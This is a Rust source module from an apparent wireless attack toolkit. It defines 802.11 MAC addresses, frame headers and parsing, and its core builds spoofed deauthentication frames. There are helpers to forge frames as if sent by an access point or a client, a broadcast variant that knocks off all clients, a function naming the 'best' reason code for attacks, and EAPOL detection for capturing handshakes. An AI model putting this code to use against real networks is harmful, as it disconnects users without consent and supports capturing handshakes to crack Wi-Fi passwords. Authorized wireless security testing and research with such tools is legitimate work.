//! 802.11 Frame structures and types
//!
//! This module provides Rust representations of IEEE 802.11 frame headers
//! and management frames used in wireless attacks.

use std::fmt;
use std::str::FromStr;
use byteorder::{LittleEndian, ByteOrder};
use serde::{Serialize, Deserialize};
use crate::error::{WirelessError, Result};

/// MAC address (6 bytes)
#[derive(Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub struct MacAddress(pub [u8; 6]);

impl MacAddress {
    /// Broadcast address (FF:FF:FF:FF:FF:FF)
    pub const BROADCAST: MacAddress = MacAddress([0xFF; 6]);
    
    /// Zero/null address
    pub const ZERO: MacAddress = MacAddress([0x00; 6]);
    
    /// Create from bytes
    pub fn new(bytes: [u8; 6]) -> Self {
        Self(bytes)
    }
    
    /// Create from slice (must be 6 bytes)
    pub fn from_slice(slice: &[u8]) -> Result<Self> {
        if slice.len() != 6 {
            return Err(WirelessError::InvalidMac(
                format!("Expected 6 bytes, got {}", slice.len())
            ));
        }
        let mut bytes = [0u8; 6];
        bytes.copy_from_slice(slice);
        Ok(Self(bytes))
    }
    
    /// Get as byte slice
    pub fn as_bytes(&self) -> &[u8] {
        &self.0
    }
    
    /// Check if this is a broadcast address
    pub fn is_broadcast(&self) -> bool {
        self.0 == [0xFF; 6]
    }
    
    /// Check if this is a multicast address (bit 0 of first octet set)
    pub fn is_multicast(&self) -> bool {
        self.0[0] & 0x01 != 0
    }
    
    /// Check if this is a locally administered address (bit 1 of first octet set)
    pub fn is_local(&self) -> bool {
        self.0[0] & 0x02 != 0
    }
}

impl fmt::Debug for MacAddress {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f, "MacAddress({})", self)
    }
}

impl fmt::Display for MacAddress {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(
            f,
            "{:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X}",
            self.0[0], self.0[1], self.0[2], self.0[3], self.0[4], self.0[5]
        )
    }
}

impl FromStr for MacAddress {
    type Err = WirelessError;
    
    fn from_str(s: &str) -> Result<Self> {
        let parts: Vec<&str> = s.split(':').collect();
        if parts.len() != 6 {
            return Err(WirelessError::InvalidMac(
                format!("Expected 6 octets separated by ':', got '{}'", s)
            ));
        }
        
        let mut bytes = [0u8; 6];
        for (i, part) in parts.iter().enumerate() {
            bytes[i] = u8::from_str_radix(part, 16)
                .map_err(|_| WirelessError::InvalidMac(
                    format!("Invalid hex octet: '{}'", part)
                ))?;
        }
        
        Ok(Self(bytes))
    }
}

/// 802.11 Frame Type (2 bits)
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
#[repr(u8)]
pub enum FrameType {
    /// Management frames (beacons, probes, auth, deauth, etc.)
    Management = 0,
    /// Control frames (ACK, RTS, CTS, etc.)
    Control = 1,
    /// Data frames (actual payload)
    Data = 2,
    /// Extension (802.11ad)
    Extension = 3,
}

impl FrameType {
    /// Parse from frame control field
    pub fn from_frame_control(fc: u16) -> Self {
        match (fc >> 2) & 0x03 {
            0 => Self::Management,
            1 => Self::Control,
            2 => Self::Data,
            _ => Self::Extension,
        }
    }
}

/// 802.11 Frame Subtype (4 bits) - Management frames only
/// Note: Subtypes are only meaningful within a frame type context
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
#[repr(u8)]
pub enum FrameSubtype {
    /// Association Request (subtype 0)
    AssociationRequest = 0,
    /// Association Response (subtype 1)
    AssociationResponse = 1,
    /// Reassociation Request (subtype 2)
    ReassociationRequest = 2,
    /// Reassociation Response (subtype 3)
    ReassociationResponse = 3,
    /// Probe Request (subtype 4)
    ProbeRequest = 4,
    /// Probe Response (subtype 5)
    ProbeResponse = 5,
    /// Timing Advertisement (subtype 6)
    TimingAdvertisement = 6,
    /// Beacon (subtype 8)
    Beacon = 8,
    /// ATIM (subtype 9)
    Atim = 9,
    /// Disassociation (subtype 10)
    Disassociation = 10,
    /// Authentication (subtype 11)
    Authentication = 11,
    /// Deauthentication (subtype 12)
    Deauthentication = 12,
    /// Action (subtype 13)
    Action = 13,
    /// Action No Ack (subtype 14)
    ActionNoAck = 14,
    
    /// Unknown subtype
    Unknown = 255,
}

impl FrameSubtype {
    /// Parse from frame control field (assumes management type)
    pub fn from_frame_control(fc: u16) -> Self {
        let subtype = ((fc >> 4) & 0x0F) as u8;
        match subtype {
            0 => Self::AssociationRequest,
            1 => Self::AssociationResponse,
            2 => Self::ReassociationRequest,
            3 => Self::ReassociationResponse,
            4 => Self::ProbeRequest,
            5 => Self::ProbeResponse,
            6 => Self::TimingAdvertisement,
            8 => Self::Beacon,
            9 => Self::Atim,
            10 => Self::Disassociation,
            11 => Self::Authentication,
            12 => Self::Deauthentication,
            13 => Self::Action,
            14 => Self::ActionNoAck,
            _ => Self::Unknown,
        }
    }
}

/// Deauthentication reason codes (IEEE 802.11-2016)
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
#[repr(u16)]
pub enum DeauthReason {
    /// Unspecified reason
    Unspecified = 1,
    /// Previous authentication no longer valid
    AuthNoLongerValid = 2,
    /// Deauthenticated because sending station is leaving
    StationLeaving = 3,
    /// Disassociated due to inactivity
    Inactivity = 4,
    /// Disassociated because AP is unable to handle all associated STAs
    ApOverload = 5,
    /// Class 2 frame received from nonauthenticated STA
    Class2FromNonAuth = 6,
    /// Class 3 frame received from nonassociated STA
    Class3FromNonAssoc = 7,
    /// Disassociated because sending STA is leaving BSS
    DisassocLeaving = 8,
    /// STA requesting (re)association not authenticated
    StaNotAuthenticated = 9,
    /// Disassociated because power capability unacceptable
    PowerCapBad = 10,
    /// Disassociated because supported channels unacceptable
    SupportedChannelsBad = 11,
    /// Invalid information element
    InvalidIE = 13,
    /// MIC failure
    MicFailure = 14,
    /// 4-Way Handshake timeout
    FourWayTimeout = 15,
    /// Group Key Handshake timeout
    GroupKeyTimeout = 16,
    /// IE in 4-Way Handshake different from (Re)AssocReq/Beacon/ProbeResp
    IEDifferent = 17,
    /// Invalid group cipher
    InvalidGroupCipher = 18,
    /// Invalid pairwise cipher
    InvalidPairwiseCipher = 19,
    /// Invalid AKMP
    InvalidAkmp = 20,
    /// Unsupported RSN information element version
    UnsupportedRsnVersion = 21,
    /// Invalid RSN information element capabilities
    InvalidRsnCapabilities = 22,
    /// IEEE 802.1X authentication failed
    Ieee8021XAuthFailed = 23,
    /// Cipher suite rejected because of security policy
    CipherRejected = 24,
}

impl DeauthReason {
    /// Get as u16 value
    pub fn as_u16(self) -> u16 {
        self as u16
    }
    
    /// Most effective reason code for deauth attacks
    pub fn best_for_attack() -> Self {
        // Class 3 is commonly used - forces client to reauthenticate
        Self::Class3FromNonAssoc
    }
}

/// 802.11 Frame Control field (2 bytes)
#[derive(Debug, Clone, Copy)]
pub struct FrameControl {
    raw: u16,
}

impl FrameControl {
    /// Create frame control for deauthentication frame
    pub fn deauth() -> Self {
        // Type: 0 (Management), Subtype: 12 (Deauth) = 0x00C0
        Self { raw: 0x00C0 }
    }
    
    /// Create frame control for disassociation frame
    pub fn disassoc() -> Self {
        // Type: 0 (Management), Subtype: 10 (Disassoc) = 0x00A0
        Self { raw: 0x00A0 }
    }
    
    /// Get frame type
    pub fn frame_type(&self) -> FrameType {
        FrameType::from_frame_control(self.raw)
    }
    
    /// Get frame subtype
    pub fn subtype(&self) -> FrameSubtype {
        FrameSubtype::from_frame_control(self.raw)
    }
    
    /// Get raw value
    pub fn raw(&self) -> u16 {
        self.raw
    }
    
    /// To little-endian bytes
    pub fn to_le_bytes(&self) -> [u8; 2] {
        self.raw.to_le_bytes()
    }
}

/// IEEE 802.11 MAC Header (24 bytes for management frames)
#[derive(Debug, Clone)]
#[repr(C, packed)]
pub struct Ieee80211Header {
    /// Frame Control (2 bytes)
    pub frame_control: [u8; 2],
    /// Duration/ID (2 bytes)
    pub duration: [u8; 2],
    /// Address 1 - Destination (6 bytes)
    pub addr1: [u8; 6],
    /// Address 2 - Source (6 bytes)
    pub addr2: [u8; 6],
    /// Address 3 - BSSID (6 bytes)
    pub addr3: [u8; 6],
    /// Sequence Control (2 bytes)
    pub seq_ctrl: [u8; 2],
}

impl Ieee80211Header {
    /// Header size in bytes
    pub const SIZE: usize = 24;
    
    /// Create a new header
    pub fn new(
        frame_control: FrameControl,
        dest: MacAddress,
        src: MacAddress,
        bssid: MacAddress,
    ) -> Self {
        Self {
            frame_control: frame_control.to_le_bytes(),
            duration: [0x3A, 0x01], // Standard duration value
            addr1: dest.0,
            addr2: src.0,
            addr3: bssid.0,
            seq_ctrl: [0x00, 0x00], // Will be set by driver typically
        }
    }
    
    /// Set sequence number
    pub fn set_sequence(&mut self, seq: u16) {
        // Sequence number is in bits 4-15, fragment in bits 0-3
        let seq_ctrl = (seq << 4) & 0xFFF0;
        self.seq_ctrl = seq_ctrl.to_le_bytes();
    }
    
    /// Get as byte slice
    pub fn as_bytes(&self) -> &[u8] {
        unsafe {
            std::slice::from_raw_parts(
                self as *const _ as *const u8,
                Self::SIZE,
            )
        }
    }
}

/// Complete Deauthentication Frame (26 bytes + radiotap)
#[derive(Debug, Clone)]
pub struct DeauthFrame {
    header: Ieee80211Header,
    reason: u16,
}

impl DeauthFrame {
    /// Total frame size (without radiotap)
    pub const SIZE: usize = Ieee80211Header::SIZE + 2; // 24 + 2 = 26 bytes
    
    /// Create a new deauth frame
    pub fn new(dest: MacAddress, src: MacAddress, bssid: MacAddress, reason: DeauthReason) -> Self {
        Self {
            header: Ieee80211Header::new(
                FrameControl::deauth(),
                dest,
                src,
                bssid,
            ),
            reason: reason.as_u16(),
        }
    }
    
    /// Create deauth frame pretending to be from AP (most common attack)
    pub fn from_ap(bssid: MacAddress, client: MacAddress, reason: DeauthReason) -> Self {
        // AP sends to client: dest=client, src=bssid, bssid=bssid
        Self::new(client, bssid, bssid, reason)
    }
    
    /// Create deauth frame pretending to be from client
    pub fn from_client(bssid: MacAddress, client: MacAddress, reason: DeauthReason) -> Self {
        // Client sends to AP: dest=bssid, src=client, bssid=bssid
        Self::new(bssid, client, bssid, reason)
    }
    
    /// Create broadcast deauth (affects all clients)
    pub fn broadcast(bssid: MacAddress, reason: DeauthReason) -> Self {
        Self::from_ap(bssid, MacAddress::BROADCAST, reason)
    }
    
    /// Set sequence number
    pub fn set_sequence(&mut self, seq: u16) {
        self.header.set_sequence(seq);
    }
    
    /// Serialize to bytes
    pub fn to_bytes(&self) -> Vec<u8> {
        let mut bytes = Vec::with_capacity(Self::SIZE);
        bytes.extend_from_slice(self.header.as_bytes());
        bytes.extend_from_slice(&self.reason.to_le_bytes());
        bytes
    }
    
    /// Get destination MAC
    pub fn destination(&self) -> MacAddress {
        MacAddress(self.header.addr1)
    }
    
    /// Get source MAC
    pub fn source(&self) -> MacAddress {
        MacAddress(self.header.addr2)
    }
    
    /// Get BSSID
    pub fn bssid(&self) -> MacAddress {
        MacAddress(self.header.addr3)
    }
}

/// Disassociation Frame (same structure as deauth)
pub type DisassocFrame = DeauthFrame;

/// Generic 802.11 frame wrapper for parsing captured packets
#[derive(Debug, Clone)]
pub struct Ieee80211Frame {
    /// Raw frame data
    data: Vec<u8>,
    /// Parsed frame control
    frame_control: FrameControl,
}

impl Ieee80211Frame {
    /// Parse from raw bytes (without radiotap header)
    pub fn parse(data: &[u8]) -> Result<Self> {
        if data.len() < 2 {
            return Err(WirelessError::InvalidFrame("Frame too short".into()));
        }
        
        let fc = LittleEndian::read_u16(&data[0..2]);
        
        Ok(Self {
            data: data.to_vec(),
            frame_control: FrameControl { raw: fc },
        })
    }
    
    /// Get frame type
    pub fn frame_type(&self) -> FrameType {
        self.frame_control.frame_type()
    }
    
    /// Get frame subtype
    pub fn subtype(&self) -> FrameSubtype {
        self.frame_control.subtype()
    }
    
    /// Check if this is a deauthentication frame
    pub fn is_deauth(&self) -> bool {
        self.frame_type() == FrameType::Management 
            && self.subtype() == FrameSubtype::Deauthentication
    }
    
    /// Check if this is an EAPOL frame (for handshake detection)
    pub fn is_eapol(&self) -> bool {
        // EAPOL frames are data frames with ethertype 0x888E
        if self.frame_type() != FrameType::Data || self.data.len() < 34 {
            return false;
        }
        
        // Check for LLC/SNAP header with EAPOL ethertype
        // Offset depends on QoS flag, typically at byte 24 or 26
        let qos = (self.frame_control.raw >> 7) & 0x01 != 0;
        let llc_offset = if qos { 26 } else { 24 };
        
        if self.data.len() < llc_offset + 8 {
            return false;
        }
        
        // LLC/SNAP: AA AA 03 00 00 00 88 8E
        self.data[llc_offset..llc_offset + 6] == [0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00]
            && self.data[llc_offset + 6..llc_offset + 8] == [0x88, 0x8E]
    }
    
    /// Get destination address (Address 1)
    pub fn destination(&self) -> Option<MacAddress> {
        if self.data.len() >= 10 {
            Some(MacAddress::from_slice(&self.data[4..10]).ok()?)
        } else {
            None
        }
    }
    
    /// Get source address (Address 2)
    pub fn source(&self) -> Option<MacAddress> {
        if self.data.len() >= 16 {
            Some(MacAddress::from_slice(&self.data[10..16]).ok()?)
        } else {
            None
        }
    }
    
    /// Get BSSID (Address 3)
    pub fn bssid(&self) -> Option<MacAddress> {
        if self.data.len() >= 22 {
            Some(MacAddress::from_slice(&self.data[16..22]).ok()?)
        } else {
            None
        }
    }
    
    /// Get raw frame data
    pub fn raw(&self) -> &[u8] {
        &self.data
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_mac_address_parse() {
        let mac: MacAddress = "AA:BB:CC:DD:EE:FF".parse().unwrap();
        assert_eq!(mac.0, [0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF]);
    }
    
    #[test]
    fn test_mac_address_display() {
        let mac = MacAddress([0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC]);
        assert_eq!(format!("{}", mac), "12:34:56:78:9A:BC");
    }
    
    #[test]
    fn test_deauth_frame() {
        let bssid: MacAddress = "AA:BB:CC:DD:EE:FF".parse().unwrap();
        let frame = DeauthFrame::broadcast(bssid, DeauthReason::Class3FromNonAssoc);
        
        let bytes = frame.to_bytes();
        assert_eq!(bytes.len(), DeauthFrame::SIZE);
        
        // Check frame control (little endian)
        assert_eq!(bytes[0], 0xC0); // Deauth subtype
        assert_eq!(bytes[1], 0x00);
        
        // Check destination is broadcast
        assert_eq!(&bytes[4..10], &[0xFF; 6]);
    }
}
